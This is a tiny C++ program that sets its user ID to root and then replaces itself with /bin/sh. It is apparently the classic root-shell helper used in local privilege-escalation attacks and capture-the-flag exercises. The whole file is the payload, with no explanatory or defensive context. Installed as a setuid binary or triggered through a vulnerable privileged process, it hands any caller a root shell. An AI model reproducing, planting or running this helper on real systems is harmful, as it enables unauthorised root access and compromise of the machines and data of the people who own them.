#include<cstdlib>
#include<unistd.h>
int main()
{
    setuid(0);
    execve("/bin/sh",NULL,NULL);
    return 0;
}
